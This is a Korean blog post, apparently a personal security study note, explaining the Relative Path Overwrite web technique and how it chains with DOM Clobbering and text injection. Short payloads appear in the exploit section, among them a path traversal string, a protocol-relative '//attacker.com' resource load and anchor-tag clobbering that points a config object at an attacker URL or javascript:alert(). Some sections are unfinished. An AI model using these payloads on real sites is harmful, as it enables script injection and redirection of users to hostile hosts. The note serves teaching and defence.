---
layout: post
title: Relative Path Overwrite
subtitle: RPO 상대 경로 사용 시 사용할 수 있는 기법
author: g3rm
categories: Web
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - WEB
  - RPO
  - CSS_Injection
  - Relative_Path_Overwrite
  - DOM_Clobbering
  - Text_Injection
sidebar:
---

## Intro
Relative Path Overwrite(RPO)란 해석 그대로 "상대 경로 덮어쓰기"라는 공격 기법? 으로 주로 리소스를 불러오는 경로에서 상대 경로로 된 URL을 덮어씌워 의도치 않는 경로로 요청하게 하도록 하여 대상 파일을 덮어쓸 수 있는 취약점입니다.   
☑️보통 해당 취약점 자체로 활용되기 보다 다른 취약점들과 연계되어 활용됩니다.

상대 경로란 URL에 `Host`가 포함되지 않은 경로로 `assets/js/config.js` 로 구성된 경로입니다.
> RPO에서 말하는 상대 / 절대 경로는 통상적으로 말하는 경로와 다를 수 있습니다.
> Absolute URL : `https://victim.com/path`
> Absolute Path : `/path`
> Relative Path : `path`
   
RPO는 해당 도메인에서 조작되는 것이기 때문에 `SOP`, `CSP` 등 다양한 보안 정책을 우회할 수 있습니다. 
## Detect & Exploit 
### Detect
어떤 공격과 연계를 하느냐에 따라 탐지 방법이 여러 개 있을 수 있습니다.
- 리소스(`<script src>`, `<link href>` 등) 주소에 관여할 수 있는 지 파악하면 됩니다.
- URL Rewrite가 적용되어 `victim.com/rpo.html`,  `victim.com/rpo.html/` 에 대해서 동일하게 `rpo.html` 를 내려주는 지 파악하면 됩니다.
- 

### Exploit
#### 리소스 주소 관여 가능 시
단순하게 주소에 관여하는 것이 끝이긴 합니다... ㅎㅎ😅
```HTML
# Path Traversal
/../../../../vuln.js

# Protocol relative URL
//attacker.com
```
#### URL Rewrite 적용되어 있을 시
이 경우 DOM Clobbering과 연계할 수 있습니다.
자체적으로 만든 동결(`freeze()`) 객체에 대해 아래의 방법으로 오류를 발생시켜 해당 객체를 불러오지 못하도록 한다면 DOM Clobbering 공격이 가능해 집니다.
>해당 내용은 추후에 DOM Clobbering 주제로 글 작성 시 이관 예정입니다.
```HTML
#config.js
window.CONFIG = {
	location: "/"
}

#victim.com/vuln.html -> victim.com/config.js
<script src="config.js"></script>

#victim.com/vuln.html/ -> victim.com/vuln.html/config.js -> error
<script src="config.js"></script>

#POC
<a id="CONFIG">1'deps</a>
<a id="CONFIG" name="location" href="https://attacker.com or javascript:alert()">2'deps</a>
```

추가적으로 하위 경로가 파라미터로 인식되어 브라우저 내에 표기될 시(Content Spoofing / Text Injection) 특정 조건 하에 공격이 가능하다고 합니다.
> 해당 내용은 더 공부 후 추가해보겠습니다...
```HTML
victim.com/vuln.html/PAYLOAD 접근 시
Server : victim.com/vuln.html 를 내려줌
Browser : victim.com/vuln.html/PAYLOAD/victim.css or victim.js 를 가져옴

victim.com/vuln.html/PAYLOAD/victim.css or victim.js 접근 시
PAYLOAD가 Error Page or vuln.html에 주입됨

-> 취약점 발생
```

#### CSS Injection

## Security Measures

단순하게 상대경로를 사용하지 않는 것이지만, 추가적으로 `<script src>`, `<link href>` 등 리소스를 불러오는 태그의 주소를 사용자가 임의로 수정하지 못하도록 하는 방안도 있습니다.

## References
[Large-Scale Analysis of Style Injection by Relative Path Overwrite](https://dl.acm.org/doi/fullHtml/10.1145/3178876.3186090)   
[Relative Path Overwrite](https://support.detectify.com/support/solutions/articles/48001048955-relative-path-overwrite)   